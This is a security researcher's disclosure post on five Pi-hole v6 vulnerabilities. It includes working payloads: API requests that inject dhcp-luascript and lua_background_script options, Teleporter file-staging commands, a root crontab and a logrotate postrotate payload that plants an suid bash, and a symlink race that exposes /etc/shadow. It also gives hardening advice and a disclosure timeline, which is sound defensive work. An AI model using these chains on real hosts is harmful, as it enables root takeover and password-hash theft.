---
title: "Pi-hole: root with extra steps"
summary: "Five ways to compromise Pi-hole: two web session config-to-code paths and three local privilege escalations"
date: '2026-08-05T00:00:00Z'
subtitle: "Root on the DNS server you forgot about"
tags: ["security", "offensive-security", "pi-hole", "privilege-escalation", "linux", "exploit", "CVE-2026-65963", "CVE-2026-50130"]
channels: ["vuln-research"]
---

Pi-hole is one of those services people install because they want to stop thinking about it. It becomes the DNS server for every phone, laptop, TV, camera, and forgotten smart plug on the network, then lives on a Raspberry Pi nobody logs into again.

Pi-hole's core daemon, `pihole-FTL`, combines a patched fork of `dnsmasq`, a DHCP server, the CivetWeb HTTP server, the REST API, an embedded Lua runtime, SQLite, and mbedTLS in one C process. One process, one address space, one blast radius.

I audited Pi-hole v6 and this post is about five of the vulnerabilities that were discovered.

| # | Vulnerability                                                | Required access                | Result                                 |
| - | ------------------------------------------------------------ | ------------------------------ | ---------------------------------------|
| 1 | dnsmasq `misc.dnsmasq_lines` -> `dhcp-luascript`             | Web session                    | code exec as `pihole` (chains to root) |
| 2 | CivetWeb `webserver.advancedOpts` -> `lua_background_script` | Web session                    | code exec as `pihole` (chains to root) |   
| 3 | `CAP_CHOWN`                                                  | Code exec under FTL (`pihole`) | code exec as `root`                    |
| 4 | Root prestart hook logrotate                                 | Code exec as `pihole`          | code exec as `root`                    |
| 5 | Root updatechecker follows a symlink                         | Code exec as `pihole`          | File disclosure or corruption          |

The two web paths are authenticated. They require the main web login, or a Pi-hole deliberately running in no-password mode. Authenticated RCE - but sharing logins to a Pi-hole web interface would not generally be expected to lead to root code execution on the host.

The audit was performed on the latest versions at the time: Core 6.4.2, FTL 6.6.2, Web 6.5.1. Confirmed unpatched in HEAD and projects' current development branches at time of reporting.

## dnsmasq_lines exec

Pi-hole v6 stores its configuration in `/etc/pihole/pihole.toml` and exposes it through `PATCH /api/config`. Most settings are normal DNS and DHCP controls. `misc.dnsmasq_lines` is an array of lines that gets copied into the generated `dnsmasq` configuration.

The validation prevents items in that array that contain newlines. But you don't need a newline, you can just inject options that execute code.

`dnsmasq` supports `dhcp-script` and `dhcp-luascript`, which execute a program for DHCP events. I use `dhcp-luascript` here for reasons explained later. Making the following API call:

```http
PATCH /api/config
Content-Type: application/json

{
  "config": {
    "misc": {
      "dnsmasq_lines": [
        "dhcp-luascript=/etc/pihole/x.lua",
        "script-arp"
      ]
    }
  }
}
```

FTL writes that line into the live configuration. When a DHCP event occurs, `dnsmasq` executes `/etc/pihole/x.lua` as the FTL process. In my tests, applying the configuration restarted FTL and `script-arp` caused the payload to run immediately.

The immediate result is code execution as `pihole`. CAP_CHOWN or the logrotate vulnerability turn that into root.

[Previous vulnerabilities](https://github.com/pi-hole/FTL/security/advisories/GHSA-9cqv-839p-gpq2) around this focused on injection through newline handling. This path does not need a newline though - the API already accepts a complete configuration, and `dhcp-luascript=` is a single valid element.

With local access as `pihole`, staging the script is trivial. With API access alone, this is actually a challenge which is where `Teleporter` comes in next.

### Teleporter File Staging

Pi-hole provides Teleporter for taking and importing backups. Using the `backup-import` feature over the API allows us to write content to a few different files under /etc/pihole/ with varying levels of control over that content. For this, we need a valid Lua script. A few work with varying levels of portability and challenges, but the cleanest is `dhcp.leases` which writes your content exactly.

In my testing on a Pi-hole installation that does not serve DHCP leases to the network, there is no impact to replacing dhcp.leases. A Pi-hole install that is serving DHCP leases would have its active leases disrupted. Could work around that by pointing dnsmasq to an alternative lease file.

The `dhcp-script` option works but requires the script file to be executable. Teleporter stages files owned by pihole and `chmod 600`. `dhcp-luascript` does not require the script to be executable so it works for Teleporter staged files. With a local foothold you can stage the script and make it executable and use either option.

Create the target `dhcp.leases` file with your Lua script, create `teleport.dhcp.tar.gz` containing that file at the root, call the Pi-hole api at `/api/teleporter` and submit it as multipart/form-data with `file` set to the tgz contents. The high-level flow to stage your content at `/etc/pihole/dhcp.leases`:

```bash
$ printf 'os.execute("id > /tmp/exec-proof; grep ^Cap /proc/self/status >> /tmp/exec-proof")\nfunction lease() end' > dhcp.leases

$ tar -zcf teleport.dhcp.tar.gz dhcp.leases

$ curl -X POST http://pi.hole/api/teleporter -F "file=@teleport.dhcp.tar.gz"
```

dnsmasq requires dhcp-luascript scripts to have a lease() function. Without it your code will still run but it looks for the lease() function after and logs `lease() function missing in Lua script` before FTL exits. systemd restarts it and causes a restart loop. Add `function lease() end` to the Lua script to prevent this.

### PoC

PoC available at [dnsmasq_lines_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/dnsmasq_lines_exec.sh). Edit `PIPASS` and `PIHOST` to your Pi-hole IP/Host and run it. It will create the teleporter file, stage the dhcp.leases file on the pihole, and update the dnsmasq config to execute our crafted script.

This can be driven through the web interface also. Create the same teleporter .tgz file, Go to Settings -> Teleporter -> import your tgz -> "Import successful. Processed files: /etc/pihole/dhcp.leases". Then go to Settings -> All settings -> Miscellaneous -> misc.dnsmasq_lines -> enter the following:

```text
dhcp-luascript=/etc/pihole/dhcp.leases
script-arp
```

Click Save.

After running the PoC check /tmp/exec-proof:

```bash
$ cat /tmp/exec-proof 
uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
CapInh: 0000000002807401
CapPrm: 0000000002807401
CapEff: 0000000002807401
CapBnd: 000001ffffffffff
CapAmb: 0000000002807401
```

### Am I Affected

Impacted: Versions 6.0 - current  
Fixed: not fixed

## CivetWeb advancedOpts

The second route is similar but on the other embedded server.

`webserver.advancedOpts` is a raw passthrough into CivetWeb. CivetWeb supports `lua_background_script`, which loads a Lua file in a background thread when the web server starts:

```http
PATCH /api/config
Content-Type: application/json

{
  "config": {
    "webserver": {
      "advancedOpts": [
        "lua_background_script=/etc/pihole/x.lua"
      ]
    }
  }
}
```

CivetWeb's Lua environment is not a restricted configuration language. It can invoke operating-system commands:

```lua
os.execute("id > /etc/pihole/pwn-hole-lua")
```

Saving the configuration restarts FTL, restarting FTL starts the web server, and the web server executes the background script.

Teleporter can again stage the file for an API-only chain:

```text
full admin session
    -> import x.lua
    -> set lua_background_script
    -> FTL restarts
    -> code executes as pihole
    -> logrotate or CAP_CHOWN chain
    -> root
```

An administrator is expected to be able to configure the DNS appliance. That is not the same as arbitrary shell execution on its operating system.

### PoC

PoC available at [civetweb_advancedopts_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/civetweb_advancedopts_exec.sh). Same as previous PoC - edit `PIPASS` and `PIHOST` to your Pi-hole IP/Host and run it. It will create the teleporter file, stage the dhcp.leases file on the pihole, and update the CivetWeb config to execute our crafted script.

Same as the first PoC this can be driven via the web interface. Create the same teleporter .tgz file, Go to Settings -> Teleporter -> import your tgz -> "Import successful. Processed files: /etc/pihole/dhcp.leases". Then go to Settings -> All settings -> Webserver and API -> webserver.advancedOpts -> enter the following:

```text
lua_background_script=/etc/pihole/dhcp.leases
```

Click Save.

After running the PoC check /tmp/exec-proof:

```bash
$  cat /tmp/exec-proof 
uid=999(pihole) gid=1001(pihole) groups=1001(pihole)
CapInh: 0000000002807401
CapPrm: 0000000002807401
CapEff: 0000000002807401
CapBnd: 000001ffffffffff
CapAmb: 0000000002807401
```

### Am I Affected

Impacted: Versions 6.3 - 6.6.2  
Fixed: Version 6.7

Official advisory states version 6.6.2 as the only impacted version. Commit [f9551b08](https://github.com/pi-hole/FTL/commit/f9551b085824704c1deb50edfde844d1b8248659) "Add webserver.advancedOpts to allow specifying arbitrary CivetWeb options" was introduced in v6.3 though. Tested and confirmed against v6.4.

## CAP_CHOWN (CHPWN)

Pi-hole does not run FTL as root. systemd starts it as `pihole`, but with this capability set:

```bash
$ grep -E "^Cap(Eff|Amb|Bnd)" /proc/$(pgrep -x pihole-FTL)/status
CapEff: 0000000002807401
CapBnd: 000001ffffffffff
CapAmb: 0000000002807401

$ capsh --decode=0x0000000002807401
0x0000000002807401=cap_chown,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_sys_nice,cap_sys_time
```

The systemd unit:

```ini
[Service]
User=pihole
AmbientCapabilities=CAP_CHOWN CAP_NET_BIND_SERVICE CAP_NET_ADMIN CAP_NET_RAW CAP_IPC_LOCK CAP_SYS_NICE CAP_SYS_TIME
```

Most of that list has an obvious relationship to DNS, DHCP, networking, or the built-in NTP service. `CAP_NET_ADMIN` and `CAP_NET_RAW` are interesting but `CAP_CHOWN` is the standout and the most immediately exploitable. It lets the process change the UID and GID of files regardless of their current owner. Ambient capabilities survive `execve` which means we can just directly run `chown`.

That is a quick hop to root - use `pihole` to take ownership and alter the contents of a file that root later executes. You can use any number of paths, I will provide several.

One example is `cron`. Typically you would just drop a file into `/etc/cron.d`. Except the Pi-hole systemd unit file has `ProtectSystem=full` which mounts /etc read-only. But `full` leaves more open than `strict`, including /var, so on Debian-family systems just place the crontab in `/var/spool/cron/crontabs/root` (/var/spool/cron/root on RHEL family) and same result, root exec.

End-to-end example in PoC below (must be run from within FTL process to have `CAP_CHOWN`, not an ssh session).

Another consequence of using `ProtectSystem=full` instead of `strict` is that we can replace the pihole scripts themselves. They live in `/opt/pihole` which is not read-only under `full`. Pick one:

```
-rwxr-xr-x 1 root root pihole-FTL-poststop.sh
-rwxr-xr-x 1 root root pihole-FTL-prestart.sh
-rwxr-xr-x 1 root root piholeLogFlush.sh
-rwxr-xr-x 1 root root updatecheck.sh
```

Same as above, chown the directory, replace/modify the script, chown it back, and trigger Pi-hole to execute it (update check, service restart, etc). Cron executes the updatecheck.sh as root daily at midnight. If you inspect the systemctl unit for pihole you will see:

``` bash
$ systemctl cat pihole-FTL | grep -E "^(ExecStartPre|ExecStopPost)"
ExecStartPre=+/opt/pihole/pihole-FTL-prestart.sh
ExecStopPost=+/opt/pihole/pihole-FTL-poststop.sh
```

The `+` means these scripts will run as root. So chown either of them, edit to add your lines, chown it back, wait for a restart or trigger one.

### PoC

This needs to be run from within FTL process, so typically as a chain with another vulnerability. PoCs are available at the end for the chains.

```bash
$ chown_cmd="$( command -v gnuchown || command -v chown )"

$ "$chown_cmd" pihole:pihole /var/spool/cron/crontabs

$ "$chown_cmd" pihole:pihole /var/spool/cron/crontabs/root 2>/dev/null || true

$ echo '* * * * * id > /tmp/pi-hole-cron-spool 2>&1' >> /var/spool/cron/crontabs/root

$ chmod 600 /var/spool/cron/crontabs/root

$ "$chown_cmd" root:crontab /var/spool/cron/crontabs/root

$ "$chown_cmd" root:crontab /var/spool/cron/crontabs
```

After running that and waiting 60 seconds you should see:

```bash
$ cat /tmp/pi-hole-cron-spool
uid=0(root) gid=0(root) groups=0(root)
```

The gnuchown check is because an Ubuntu26 system I tested this against was using the modern rust-coreutils package. That version of chown ran openat(O_RDONLY) on the target directory before changing ownership. This fails and it exits before attempting the chown. GNU gnuchown works and was installed by default on my test machine. Calling the chown() syscall directly works also. The linked PoC selects gnuchown when available.

### Am I Affected

Impacted: Versions 6.0 - current  
Fixed: not fixed

To verify, check the caps of your running FTL process and see if it has `cap_chown`:

```bash
$ grep -E "^CapEff" /proc/$(pgrep -x pihole-FTL)/status
CapEff: 0000000002807401

$ capsh --decode="2807401"
0x0000000002807401=cap_chown,cap_net_bind_service,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_sys_nice,cap_sys_time
```

Or check the systemd unit file:

```bash
$ systemctl cat pihole-FTL | grep Capabilities
AmbientCapabilities=CAP_NET_BIND_SERVICE CAP_NET_RAW CAP_NET_ADMIN CAP_SYS_NICE CAP_IPC_LOCK CAP_CHOWN CAP_SYS_TIME
```

## Prestart ownership

This path does not require CAP_CHOWN. The pihole user already controls the directory entry, and the root prestart hook supplies the trusted ownership on the attacker’s behalf.

Pi-hole ships its `logrotate` configuration stored in `/etc/pihole/logrotate` instead of the usual `/etc/logrotate.d/`. logrotate is interesting in that it accepts configuration options (`firstaction`, `postrotate`, etc) that will execute a script as the caller (root) so it is one of the reliable methods of turning a file write into code execution. It rejects an untrusted configuration file by requiring the file not be group/world-writable and that the file is owned by root.

The pihole-FTL systemd service runs a prestart script with elevated privileges:

```ini
[Service]
User=pihole
ExecStartPre=+/opt/pihole/pihole-FTL-prestart.sh
```

The `+` prefix tells systemd to run the command outside the unit's normal user and credential restrictions. The prestart script runs as root and on each run it executes:

```bash
chown -R pihole:pihole /etc/pihole/ /var/log/pihole/
chown root:root /etc/pihole/logrotate
```

That file lives in a directory owned by `pihole`. Owning the directory means `pihole` can replace the pathname even when the current inode is root-owned.

### PoC

PoC available at [prestart_logrotate.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/prestart_logrotate.sh).

The complete path end-to-end as `pihole`:

```bash
$ mv /etc/pihole/logrotate /etc/pihole/logrotate.save
$ cat > /etc/pihole/logrotate <<'EOF'
/var/log/pihole/pihole.log {
    daily
    rotate 1
    postrotate
        install -m 4755 /bin/bash /usr/local/bin/pihole-root
        id > /tmp/pwn-hole-logrotate-id
        grep -E "^Cap(Eff|Bnd)" /proc/self/status >> /tmp/pwn-hole-logrotate-caps
    endscript
}
EOF

$ chmod 600 /etc/pihole/logrotate
```

Restart pihole-FTL and the root prestart hook chowns the logrotate file to root:root. Pi-hole has a /etc/cron.d/pihole entry that triggers its logrotate runs at midnight every day and on reboots. The next reboot or midnight run executes the postrotate block as root. In this example it leaves an suid bash in /usr/local/bin/pihole-root and two evidence files in /tmp.

The next root logrotate run (after FTL restart) accepts the file as root-owned and runs the attacker's `postrotate` command as root:

```console
$ cat /tmp/pwn-hole-logrotate-id
uid=0(root) gid=0(root) groups=0(root)

$ cat /tmp/pwn-hole-logrotate-caps
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff

$ /usr/local/bin/pihole-root -p -c id
uid=999(pihole) gid=995(pihole) euid=0(root) groups=995(pihole)
```

### Am I Affected

Impacted: Versions 6.0 - 6.4.2  
Fixed: Version 6.4.3

## updatechecker symlinks

A separate root cron job runs `pihole updatechecker`. That script runs the following:

```bash
VERSION_FILE="/etc/pihole/versions"

truncate -s 0 "${VERSION_FILE}"
chmod 644 "${VERSION_FILE}"

# Version data is then appended to the same path.
```

None of those operations refuse symlinks. Same as the earlier logrotate vulnerability, because `pihole` controls `/etc/pihole`, it controls `/etc/pihole/versions` and it can point it to any file.

Something like:

```bash
# DO NOT RUN THIS UNLESS YOU WANT TO BREAK YOUR PI-HOLE
$ ln -sf /etc/shadow /etc/pihole/versions
```

The next update check follows the symlink, truncates `/etc/shadow`, changes its mode, and appends version data to it. Effectively breaking the system, so not ideal.

This is three separate file operations: the truncate -> chmod -> write. If we race the operations we can replace the symlink in-between so it points to a different file at each operation. It looks like a difficult race given the operations are consecutive. Fortunately, this is a shell script which means each operation is a separate exec, which means we can easily win the race 100% of the time in my testing.  

My approach to winning the race to expose a root-owned file without truncating it or writing version strings into it:

1. Stage a symlink to /etc/shadow for a later fast rename operation.
2. Leave a non-empty `versions` file in place for the initial `truncate`.
3. Watch `inotify` on the `versions` file for the resulting `IN_MODIFY` event.
4. Replace the `versions` file using `renameat2(RENAME_EXCHANGE)` on the prepared symlink.
5. Let root's `chmod 644` land through the symlink on the target.
6. Watch `inotify` on /etc for the resulting `IN_ATTRIB` event.
7. Rename the truncated file back to `versions`.
8. The update script does its normal append to the correct file.
9. Everything downstream works normally. This does not break or interrupt any normal update operations.

The target is left intact except for its mode. The updater writes its version data to the real file. Against `/etc/shadow`, the result is readable password hashes. Against a useful root credential or private key, it can be a direct privilege escalation. The PoC worked and won each race 250 times out of 250 tests on my test system running Ubuntu 26.04.

PoC is in the table at the end. One word of caution, if you were to lose a race you have a reasonable chance of appending a bunch of version-file junk to your /etc/shadow.

`fs.protected_symlinks` does not stop this path. That protection is aimed at symlinks in sticky, world-writable directories such as `/tmp`. `/etc/pihole` is an ordinary directory controlled by the service account, so the root process follows the link normally.

This is another bug where a root job is performing security-sensitive operations in a directory whose entries are controlled by `pihole`. Following symlinks especially when they are owned by a different user would need a valid use-case and a lot of care.

### PoC

PoC available at [updatecheck_symlink.py](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/updatecheck_symlink.py).

```bash
$ ls -al /etc/shadow
---------- 1 root shadow 1080 Jul  4 11:48 /etc/shadow

$ python3 updatecheck_symlink.py
[-] staged, waiting for the next updatechecker cron...
[+] decoy fired. symlink staged, waiting for chmod..
[+] /etc inotify fired. symlink (hopefully) landed. swapped versions file. done
[+] worked. /etc/shadow is now chmod 644

$ ls -al /etc/shadow
-rw-r--r-- 1 root shadow 1080 Jul  4 11:48 /etc/shadow
```

### Am I Affected

Impacted: Versions 6.0 - current  
Fixed: not yet

## Chaining web to root

If you have a web login, the two configuration findings give code execution as the FTL service account. Pick one of the LPEs and turn that into root.

```text
full Pi-hole admin session, or no-password mode
    -> write raw dnsmasq or CivetWeb options
    -> execute code as pihole
        -> CAP_CHOWN + cron
           or root prestart + logrotate
            -> uid 0
```

If you already have a local foothold as `pihole` you're already halfway there and pick from the same LPEs. If the foothold executes inside FTL, the process inherits FTL’s ambient capabilities and can use the CAP_CHOWN path. A plain shell running as pihole (over ssh, etc) does not have those capabilities, but it can still use the prestart/logrotate LPE and updatechecker paths.

The recurring failure across all five findings: root and `pihole` shared control over the same pathnames. Sometimes `pihole` supplied the contents and `CAP_CHOWN` supplied the owner. Sometimes a root prestart hook supplied the owner. Sometimes a root cron job followed a pathname while `pihole` swapped the object underneath it.

The individual bugs are different. The trust failure is the same.

### PoC

PoC is available at [poc/pi-hole/chain_web_root_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_web_root_exec.sh)

End-to-end from web session to root on the Pi-hole host:

```bash
$ ./chain_web_root_exec.sh
[*] logged in, sid=WVPwEDd8****
[*] saved backup at pihole-backup-original.zip
[*] built payload.tar.gz for Teleporter
[+] staged /etc/pihole/dhcp.leases on pihole host
[+] pihole loaded our dnsmasq config, check for exec result on pihole host
[*] pihole should have executed the code and attempted escalation
[*] if vulnerable version with CAP_CHOWN root will execute your code within 60 seconds
[*] otherwise root will execute your code after the next FTL restart -> logrotate cycle
```

### Am I Affected

Impacted: Versions 6.0 - current  
Fixed: not fixed

## Hardening

The direct fixes are straightforward but mostly fall to the maintainers:

- Allowlist safe dnsmasq and CivetWeb options instead of writing raw API contents.
- Validate imported Teleporter files according to their expected content before writing them.
- Keep every root-consumed object in a directory whose entries cannot be replaced by pihole.
- Remove CAP_CHOWN.
- Build version files through a root-owned temporary file and atomically install them without following symlinks.

Things you can do (and should be doing regardless):
- Keep the API on isolated trusted admin networks, firewalled as restrictive as possible
- Use a strong main password
- Do not run no-password mode

Building SELinux policy for Pi-hole would be nice to have but a little ambitious. I will see if the maintainers strip `CAP_CHOWN`. I may add significant hardening to the systemd unit file and see what breaks and where I end up.

## Proofs of concept

The PoCs are all up on my GitHub at [linnemanlabs/advisories](https://github.com/linnemanlabs/advisories).

These PoCs modify live Pi-hole configuration and may alter DHCP leases, root’s crontab, logrotate configuration, file ownership, or the mode of security-sensitive files. Run them only on disposable test systems and/or review and understand each script before running them.

| Finding                       | PoC                                                                  | CVE |
| ----------------------------- | -------------------------------------------------------------------- | --- |
| dnsmasq_lines config -> pihole exec     | [poc/pi-hole/dnsmasq_lines_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/dnsmasq_lines_exec.sh) |     |
| CivetWeb advancedOpts config -> pihole exec  | [poc/pi-hole/civetweb_advancedopts_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/civetweb_advancedopts_exec.sh) | [CVE-2026-65963](https://github.com/pi-hole/FTL/security/advisories/GHSA-8j7w-m3cr-6q6x) ([SakusenSec](https://github.com/SakusenSec)) |
| CAP_CHOWN pihole -> root exec     | [poc/pi-hole/cap_chown_cron.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/cap_chown_cron.sh) |     |
| prestart pihole -> root exec       | [poc/pi-hole/prestart_logrotate.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/prestart_logrotate.sh) | [CVE-2026-50130](https://github.com/pi-hole/pi-hole/security/advisories/GHSA-h8w9-qx2v-wrww) ([supperhellokitty20](https://github.com/supperhellokitty20)) |
| Updatechecker symlink race    |  [updatecheck_symlink.py](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/updatecheck_symlink.py) |     |
| Web -> Root exec chain    |  [chain_web_root_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_web_root_exec.sh) |     |

The end-to-end chain combining vulns from web-session to root code-exec is [chain_web_root_exec.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/pi-hole/chain_web_root_exec.sh).

## Disclosure timeline

* **2026-07-03** - Audit completed.

* **2026-07-04/05** - Five reports submitted through GitHub private vulnerability reporting across `pi-hole/pi-hole` and `pi-hole/FTL`.

* **2026-07-15** - Emailed `disclosure@pi-hole.net` asking for acknowledgement that the reports had been received.

* **2026-07-19** - Found a first duplicate disclosure created 7/6 and closed my report.

* **2026-07-20** - Found a second duplicate advisory published 7/6 and closed that report.

* **2026-07-28** - Emailed `disclosure@pi-hole.net` to advise I plan to disclose publicly at 30 day mark. 3 reports remain unacknowledged.

* **2026-08-05** - Public technical disclosure published.

No maintainer has replied to any of my reports or disclosure emails as of publication.

## Credits

The two duplicate findings were reported before mine and were already being handled privately when I submitted my reports.

| Bug | Researcher | CVE | GHSA |
| --- | ---------- | --- | ---- |
| Pi-hole prestart logrotate | [supperhellokitty20](https://github.com/supperhellokitty20) | CVE-2026-50130 | [GHSA-h8w9-qx2v-wrww](https://github.com/pi-hole/pi-hole/security/advisories/GHSA-h8w9-qx2v-wrww)|
| CivetWeb advancedOpts | [SakusenSec](https://github.com/SakusenSec) | CVE-2026-65963 | [GHSA-8j7w-m3cr-6q6x](https://github.com/pi-hole/FTL/security/advisories/GHSA-8j7w-m3cr-6q6x) |

## Tested versions

The audit was performed on the latest versions at the time:
- Core 6.4.2
- FTL 6.6.2
- Web 6.5.1

Tested on both Raspbian and Ubuntu 26.

## Conclusion

TL;DR:

- Pi-hole exposed raw configuration for two embedded servers.
- Both servers have options that execute programs.
- The service account holds excessive capabilities that chain to root exec.
- A root prestart hook effectively signs off on attacker-controlled content by changing it to root ownership.
- A root cron job followed pathnames in a directory controlled by that same service account.
- Additional systemd unit hardening could be applied.

Each decision looks smaller when viewed alone:

- a web-server configuration option
- a non-root daemon
- one retained capability
- one ownership repair
- one cached version file

Those decisions turn an authenticated Pi-hole web session into code execution as pihole, and chain pihole into root through multiple independent paths. The daemon is non-root, but the surrounding system repeatedly allows its service account to author objects that root later trusts.
